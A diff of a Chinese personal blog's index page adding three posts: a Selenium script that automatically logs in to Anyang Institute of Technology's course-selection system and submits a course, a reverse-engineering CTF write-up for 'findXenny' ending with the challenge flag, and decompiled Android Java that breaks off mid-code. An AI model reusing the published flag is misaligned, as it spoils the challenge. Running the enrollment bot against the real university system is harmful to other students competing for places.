@@ -123,12 +123,12 @@
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">8</span></a>
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">10</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">47</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">52</span></a>
 
   </li>
   </ul>
@@ -154,6 +154,505 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/06/%E5%AE%89%E9%98%B3%E5%B7%A5%E5%AD%A6%E9%99%A2%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/06/%E5%AE%89%E9%98%B3%E5%B7%A5%E5%AD%A6%E9%99%A2%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" class="post-title-link" itemprop="url">安阳工学院抢课脚本</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-06 17:24:26 / 修改时间：17:32:22" itemprop="dateCreated datePublished" datetime="2023-09-06T17:24:26+08:00">2023-09-06</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/other/" itemprop="url" rel="index"><span itemprop="name">other</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="基于selenium的安阳工学院高校综合服务管理平台的抢课脚本"><a href="#基于selenium的安阳工学院高校综合服务管理平台的抢课脚本" class="headerlink" title="基于selenium的安阳工学院高校综合服务管理平台的抢课脚本"></a>基于selenium的安阳工学院高校综合服务管理平台的抢课脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys <span class="keyword">import</span> Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">username=<span class="string">&quot;输入你的学号&quot;</span>      <span class="comment">#学号</span></span><br><span class="line">password=<span class="string">&quot;输入你的密码&quot;</span>        <span class="comment">#密码</span></span><br><span class="line">driver = webdriver.Edge()   <span class="comment"># 使用Edge浏览器，可以根据需要选择其他浏览器</span></span><br><span class="line">driver.maximize_window()    <span class="comment">#窗口最大化</span></span><br><span class="line">driver.get(<span class="string">&quot;https://jwgl.ayit.edu.cn/cas/login.action&quot;</span>)     <span class="comment">#访问登录页面</span></span><br><span class="line"></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;username1&quot;</span>).click()              <span class="comment">#点击输入框</span></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;username&quot;</span>).send_keys(username)   <span class="comment">#输入账号</span></span><br><span class="line"></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;password1&quot;</span>).click()              <span class="comment">#点击输入框</span></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;password&quot;</span>).send_keys(password)   <span class="comment">#输入密码</span></span><br><span class="line"></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;login&quot;</span>).click()                  <span class="comment">#登录</span></span><br><span class="line"> </span><br><span class="line">wait = WebDriverWait(driver, <span class="number">10</span>)    <span class="comment"># 等待登录后的页面元素，设置合适的等待时间</span></span><br><span class="line"><span class="comment">#wait.until(EC.presence_of_element_located((By.ID, &quot;header-apps&quot;)))   #等待主控加载完成 </span></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;header-apps&quot;</span>).click()    <span class="comment">#点击主控</span></span><br><span class="line"></span><br><span class="line">driver.switch_to.frame(<span class="string">&#x27;frmDesk&#x27;</span>)               <span class="comment">#进入frmDesk框架</span></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;S202&quot;</span>).click()       <span class="comment">#网上选课</span></span><br><span class="line">driver.find_element(By.ID,<span class="string">&quot;title782&quot;</span>).click()   <span class="comment">#选课(按上课时间)</span></span><br><span class="line"></span><br><span class="line">driver.switch_to.default_content()              <span class="comment">#进入主框架</span></span><br><span class="line">driver.switch_to.frame(<span class="string">&#x27;frmReport&#x27;</span>)             <span class="comment">#进入操作框架</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#print(driver.page_source)</span></span><br><span class="line">driver.find_element(By.ID, <span class="string">&quot;k22&quot;</span>).click()       <span class="comment">#进入选课界面</span></span><br><span class="line"></span><br><span class="line">mother_window = driver.current_window_handle    <span class="comment">#记录当前窗口</span></span><br><span class="line">windows = driver.window_handles                 <span class="comment"># 当前打开的所有窗口</span></span><br><span class="line">driver.switch_to.window(windows[-<span class="number">1</span>])            <span class="comment"># 转换到最新打开的窗口</span></span><br><span class="line">new_window = driver.current_window_handle       <span class="comment">#记录新打开的窗口</span></span><br><span class="line"></span><br><span class="line">driver.switch_to.frame(<span class="string">&#x27;frmReport&#x27;</span>)</span><br><span class="line">driver.find_element(By.ID, <span class="string">&quot;tr6_check_me&quot;</span>).click()  <span class="comment">#选择第六行对应的课程</span></span><br><span class="line">driver.switch_to.default_content()</span><br><span class="line">driver.find_element(By.ID, <span class="string">&quot;btnSubmit&quot;</span>).click()     <span class="comment">#提交</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/04/findXenny/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/04/findXenny/" class="post-title-link" itemprop="url">findXenny</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-04 19:36:04 / 修改时间：19:42:52" itemprop="dateCreated datePublished" datetime="2023-09-04T19:36:04+08:00">2023-09-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverrse/" itemprop="url" rel="index"><span itemprop="name">reverrse</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>用<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=IDA&spm=1001.2101.3001.7020">IDA</a>反编译，找关键字符串：</p>
+<p><img src="/../images/findXenny/image-20230904194057067.png" alt="image-20230904194057067"></p>
+<p>查看调用找到主函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_140018C10</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+28h] [rbp+8h]</span></span><br><span class="line">  _QWORD *v12; <span class="comment">// [rsp+68h] [rbp+48h]</span></span><br><span class="line">  _QWORD *v13; <span class="comment">// [rsp+88h] [rbp+68h]</span></span><br><span class="line">  _QWORD *v14; <span class="comment">// [rsp+A8h] [rbp+88h]</span></span><br><span class="line">  _QWORD *v15; <span class="comment">// [rsp+C8h] [rbp+A8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v16; <span class="comment">// [rsp+1A4h] [rbp+184h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// [rsp+1C4h] [rbp+1A4h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+1E8h] [rbp+1C8h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">130</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v18 = <span class="number">-2</span>i64;</span><br><span class="line">  <span class="built_in">sub_14001112C</span>(&amp;unk_14002F034);</span><br><span class="line">  <span class="built_in">sub_14001173F</span>(&amp;v11);</span><br><span class="line">  v2 = <span class="built_in">sub_140011262</span>(std::cout, <span class="string">&quot;Tell Me! Where is our xenny??&quot;</span>);</span><br><span class="line">  std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v2, sub_1400111FE);</span><br><span class="line">  <span class="built_in">sub_14001129E</span>(std::cin, &amp;v11);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)<span class="built_in">sub_140011753</span>(&amp;v11) &gt;= <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = (_QWORD *)(<span class="built_in">sub_1400115EB</span>(&amp;v11) + <span class="number">5</span>);</span><br><span class="line">    v5 = <span class="built_in">sub_140011753</span>(&amp;v11);</span><br><span class="line">    *((_BYTE *)v12 + v5 - <span class="number">6</span>) = <span class="number">0</span>;</span><br><span class="line">    v13 = v12;</span><br><span class="line">    v14 = v12 + <span class="number">1</span>;</span><br><span class="line">    v15 = v12 + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">sub_140011514</span>();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029370</span>(*v13)</span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029378</span>(*v14)</span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029380</span>(*v15) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = <span class="built_in">sub_140011262</span>(std::cout, <span class="string">&quot;Try harder&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v7, sub_1400111FE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v6 = <span class="built_in">sub_140011262</span>(std::cout, <span class="string">&quot;I can&#x27;t believe my golden doge eye! we are comarde!&quot;</span>);</span><br><span class="line">      std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v6, sub_1400111FE);</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_14001137A</span>(&amp;v11);</span><br><span class="line">    v4 = v17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sub_140011262</span>(std::cout, <span class="string">&quot;Try harder&quot;</span>);</span><br><span class="line">    std::basic_ostream&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;::<span class="keyword">operator</span>&lt;&lt;(v3, sub_1400111FE);</span><br><span class="line">    v16 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">sub_14001137A</span>(&amp;v11);</span><br><span class="line">    v4 = v16;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = v4;</span><br><span class="line">  <span class="built_in">sub_140011695</span>(&amp;v10, &amp;unk_1400248E0);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970</span></span><br></pre></td></tr></table></figure>
+
+<p>这里是关键判断</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029370</span>(*v13)</span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029378</span>(*v14)</span><br><span class="line">      || (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">qword_140029380</span>(*v15) )</span><br></pre></td></tr></table></figure>
+
+<p>程序运行的时候会自己解密，直接下<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%96%AD%E7%82%B9&spm=1001.2101.3001.7020">断点</a>动态调试</p>
+<p><img src="/../images/findXenny/image-20230904194144123.png" alt="image-20230904194144123"></p>
+<p>根据程序要求输入16位长度</p>
+<p><img src="/../images/findXenny/image-20230904194156542.png" alt="image-20230904194156542"></p>
+<p><img src="/../images/findXenny/image-20230904194206141.png" alt="image-20230904194206141"></p>
+<p>选中按C键转换成代码</p>
+<p><img src="/../images/findXenny/image-20230904194214459.png" alt="image-20230904194214459"></p>
+<p>按P键转换成函数，然后就可以按F5<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E7%BC%96%E8%AF%91&spm=1001.2101.3001.7020">反编译</a>了</p>
+<p><img src="/../images/findXenny/image-20230904194229875.png" alt="image-20230904194229875"></p>
+<p>可以看出第一部分代码是要求要等于’oh_you_f’</p>
+<p>剩下两段同理</p>
+<p><img src="/../images/findXenny/image-20230904194241887.png" alt="image-20230904194241887"></p>
+<p><img src="/../images/findXenny/image-20230904194249242.png" alt="image-20230904194249242"></p>
+<p>得到最终的flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh_you_found_our_x3nny</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/03/MyAPK/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Dvgd.jpg">
+      <meta itemprop="name" content="Dvgd">
+      <meta itemprop="description" content="Welcome to my blog.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Dvgd">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/09/03/MyAPK/" class="post-title-link" itemprop="url">MyAPK</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-09-03 11:14:46 / 修改时间：11:16:18" itemprop="dateCreated datePublished" datetime="2023-09-03T11:14:46+08:00">2023-09-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Android/" itemprop="url" rel="index"><span itemprop="name">Android</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="MyAPK"><a href="#MyAPK" class="headerlink" title="MyAPK"></a>MyAPK</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.moible.r15;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.util.Timer;</span><br><span class="line"><span class="keyword">import</span> java.util.TimerTask;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> TextView info;</span><br><span class="line">    <span class="keyword">private</span> Button start;</span><br><span class="line">    <span class="keyword">private</span> Button stop;</span><br><span class="line">    <span class="keyword">private</span> Timer timer;</span><br><span class="line">    <span class="keyword">private</span> TimerTask timerTask;</span><br><span class="line">    <span class="keyword">private</span> Toast ts;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Boolean</span> <span class="variable">started</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">success</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">getit</span><span class="params">(String input)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">byte</span>[] message;</span><br><span class="line">        <span class="type">int</span> messageLength;</span><br><span class="line">        <span class="type">int</span> messageLength2;</span><br><span class="line">        <span class="type">int</span> f;</span><br><span class="line">        <span class="type">int</span> g;</span><br><span class="line">        <span class="type">int</span>[] T = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">64</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">64</span>; i2++) &#123;</span><br><span class="line">            T[i2] = (<span class="type">int</span>) (Math.abs(Math.sin(i2 + <span class="number">1</span>)) * <span class="number">4.294967296E9d</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] message2 = input.getBytes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">d</span> <span class="operator">=</span> message2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">numBlocks</span> <span class="operator">=</span> ((d + <span class="number">8</span>) &gt;&gt;&gt; <span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">totalLength</span> <span class="operator">=</span> numBlocks &lt;&lt; <span class="number">6</span>;</span><br><span class="line">        <span class="type">byte</span>[] paddedMessage = <span class="keyword">new</span> <span class="title class_">byte</span>[totalLength];</span><br><span class="line">        System.arraycopy(message2, <span class="number">0</span>, paddedMessage, <span class="number">0</span>, d);</span><br><span class="line">        paddedMessage[d] = Byte.MIN_VALUE;</span><br><span class="line">        <span class="type">long</span> <span class="variable">messageBits</span> <span class="operator">=</span> d * <span class="number">8</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            i = <span class="number">8</span>;</span><br><span class="line">            <span class="keyword">if</span> (i3 &gt;= <span class="number">8</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            paddedMessage[(totalLength - <span class="number">8</span>) + i3] = (<span class="type">byte</span>) (messageBits &gt;&gt;&gt; (i3 * <span class="number">8</span>));</span><br><span class="line">            i3++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] state = &#123;-<span class="number">1732584194</span>, -<span class="number">271733879</span>, <span class="number">271733878</span>, <span class="number">1732584193</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i4 &lt; numBlocks) &#123;</span><br><span class="line">            <span class="type">int</span>[] block = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">16</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (i4 &lt;&lt; <span class="number">6</span>) + (j &lt;&lt; <span class="number">2</span>);</span><br><span class="line">                block[j] = (paddedMessage[index] &amp; <span class="number">255</span>) | ((paddedMessage[index + <span class="number">1</span>] &amp; <span class="number">255</span>) &lt;&lt; i) | ((paddedMessage[index + <span class="number">2</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((paddedMessage[index + <span class="number">3</span>] &amp; <span class="number">255</span>) &lt;&lt; <span class="number">24</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> state[<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> <span 